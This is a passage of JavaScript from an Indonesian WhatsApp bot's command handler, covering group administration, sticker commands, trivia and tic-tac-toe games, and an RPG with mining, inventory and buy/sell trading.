if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
kesper.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted:m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
break
//=================================================//
case 'searchgroups':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
reply(res)
});
break
//=================================================//
case 'kick': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kesper.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'add': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kesper.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kesper.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kesper.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//
case 'setcmd': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
reply(`Done!`)
}
break
//=================================================//
case 'publik': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.public = true
reply('Sukse Change To Publict')
}
break
//=================================================//
case 'self': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
kesper.public = false
reply('Sukses Change To Self')
}
break
case 'listcmd': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let teks = `
*List Cmd Sticker*
${Object.entries(global.db.data.sticker).map(([key, value], index) => `True : ${value.text}`).join('\n')}
`.trim()
kesper.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'ping': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Hay Kak ${pushname} 👋 Selamat ${salam}

RESPONS  ${latensi.toFixed(4)}
AKTIF Selama : ${runtime(process.uptime())}
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
kesper.sendMessage(m.chat, { image: casthumb, caption: respon }, { quoted:exe })
}
break

//=================================================//
case 'antilink': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'ban': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!args[0]) return reply(`*Enter Option Select add or delete*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('*User has been banned*')
banned.push(orgnye)
reply(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return reply('*ban lifted you happy*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Success Removing Banned Users*`)
} else {
reply("Error")
}
}
break
//=================================================//
case 'user': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!args[0]) return m.reply(`*Example* : #user add 628xxxx`)
if (args[1]) {
orgnye = args[1]
} else if (m.quoted) {
orgnye = m.quoted.sender.split("@")[0]
}
const isCwner = owner.includes(orgnye)
if (args[0] === "add") {
if (isCwner) return m.reply('User sudah menjadi owner')
owner.push(orgnye)
m.reply(`Selamat Anda Telah Bergabung`)
} else if (args[0] === "del") {
if (!isCwner) return m.reply('User bukan owner')
let delcwner = owner.indexOf(orgnye)
owner.splice(delcwner, 1)
m.reply(`Maaf Anda Telah Hapus`)
} else {
m.reply("Error")
}
}
break
//=================================================//
	    case 'family100': {
	    if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await kesper.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
case 'kuismath': case 'math': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                kesper.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await kesper.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await kesper.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
            if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
            delete this.game[roomnya.id]
            m.reply(`Berhasil delete session room tictactoe !`)
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await kesper.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) kesper.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
case 'tebak': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
if (args[0] === "lagu") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await kesper.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
kesper.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
kesper.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kesper.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
}
} else if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
kesper.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
kesper.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kesper.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
kesper.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
kesper.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kesper.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
}
} else if (args[0] === 'kalimat') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
kesper.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
kesper.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kesper.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
} else if (args[0] === 'lirik') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
kesper.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
kesper.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kesper.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
}
} else if (args[0] === 'lontong') {
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
kesper.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
kesper.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kesper.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
}
}
}
break

//═══════════[ Rpg Menu ]═══════════\\

 //cr thunder
case 'inventori': case 'inventory': case 'profile':{
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
if (!isInventory){ addInventori(m.sender) }
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }

let teksehmazeh = `_[ INFO USER ]_\n\n`
teksehmazeh += `*❤ ️•Darah kamu:* ${getDarah(m.sender)}\n`
teksehmazeh += `*◻️️ •Besi kamu:* ${getBesi(m.sender)}\n`
teksehmazeh += `*🌟 •Emas Kamu:* ${getEmas(m.sender)}\n`
teksehmazeh += `*❇️ •Emerald Kamu:* ${getEmerald(m.sender)}\n`
teksehmazeh += `*⏺ •️Limit kamu:* ${getLimit(m.sender)}\n`
teksehmazeh += `*🧪 •Potion Kamu:* ${getPotion(m.sender)}\n\n`
teksehmazeh += `_[ HASIL BURUAN ]_\n\n`
teksehmazeh += `*🐟 •Ikan:* ${getIkan(m.sender)}\n`
teksehmazeh += `*🐔 •Ayam:* ${getAyam(m.sender)}\n`
teksehmazeh += `*🐇 •Kelinci:* ${getKelinci(m.sender)}\n`
teksehmazeh += `*🐑 •Domba:* ${getDomba(m.sender)}\n`
teksehmazeh += `*🐄 •Sapi:* ${getSapi(m.sender)}\n`
teksehmazeh += `*🐘 •Gajah:* ${getGajah(m.sender)}\n\n`
reply(teksehmazeh)
}
break
 case 'leaderboard': { 
 if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let txt = `「 *LEADERBOARD* 」\n\n`
for (let i of _buruan){
txt += `➸ *ID :* ${i.id}\n`
txt += `*🐟 Ikan* : ${i.ikan}\n`
txt += `*🐔 Ayam* : ${i.ayam}\n`
txt += `*🐇 Kelinci* : ${i.kelinci}\n`
txt += `*🐑 Domba* : ${i.domba}\n`
txt += `*🐄 Sapi* : ${i.sapi}\n`
txt += `*🐘 Gajah* : ${i.gajah}\n\n`
}
 reply(txt)
}
 break
case 'mining': case 'mine':{
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!isInventory){ addInventori(m.sender) }
if (isCekDarah < 1) return reply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( () => {
let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Menambang Lagi ⛏️'
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: './casper-file/gambarnye/tambang.jpg' },
 caption: caption,
 footer: pushname,
 buttons: buttons,
 headerType: 4
}
kesper.sendMessage(from, buttonMessage, { quoted: m })

}, 7000)
setTimeout( () => {
reply(`${pushname} Mulai Menambang⛏️`)
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sended, emasnya)
addEmerald(m.sender, emeraldnya)
}
break
//transaksi
 case 'beli': case 'buy':{
 if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`) 
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 if (!q) return reply(`Apa yg ingin kamu beli?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)
 var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Potion Mu:* ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Bait Food Mu:* ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Your Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { reply("Incorrect Format!") }
 }
 break
 
 case 'sell': case 'jual':{
 if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
 if (!q) return reply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 var anu = args[1]
 if (args[0] === 'ikan'){
 if (isIkan < anu) return reply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
 let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ikan Mu:* ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'ayam'){
 if (isAyam < anu) return reply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
 let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ayam Mu:* ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'kelinci'){
 if (isKelinci < anu) return reply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Kelinci Mu:* ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'domba'){
 if (isDomba < anu) return reply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Domba Mu:* ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sapi'){
 if (isSapi < anu) return reply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Sapi Mu:* ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gajah'){
 if (isGajah < anu) return reply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
